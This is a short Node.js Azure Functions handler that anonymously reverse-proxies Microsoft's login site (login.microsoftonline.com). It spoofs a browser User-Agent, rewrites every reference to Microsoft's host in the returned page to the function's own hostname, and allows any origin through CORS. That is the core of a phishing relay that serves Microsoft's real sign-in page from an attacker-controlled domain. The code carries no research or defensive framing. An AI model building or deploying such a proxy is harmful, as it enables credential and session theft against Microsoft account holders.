const { app } = require('@azure/functions');

app.http('proxy', {
    methods: ['GET', 'POST'],
    authLevel: 'anonymous',
    route: '{*path}',
    handler: async (request, context) => {
        const path = request.params.path || '';
        
        try {
            // Simple proxy to Microsoft
            const upstream_url = `https://login.microsoftonline.com/${path}${request.url.includes('?') ? request.url.substring(request.url.indexOf('?')) : ''}`;
            
            const response = await fetch(upstream_url, {
                method: request.method,
                headers: {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            });
            
            const body = await response.text();
            const originalHost = 'login.microsoftonline.com';
            const newHost = request.headers.get('host');
            
            const modifiedBody = body.replace(new RegExp(originalHost, 'g'), newHost);
            
            return {
                status: response.status,
                headers: {
                    'Content-Type': response.headers.get('content-type') || 'text/html',
                    'Access-Control-Allow-Origin': '*'
                },
                body: modifiedBody
            };
        } catch (error) {
            context.log('Proxy error:', error);
            return {
                status: 500,
                body: `Proxy Error: ${error.message}`
            };
        }
    }
});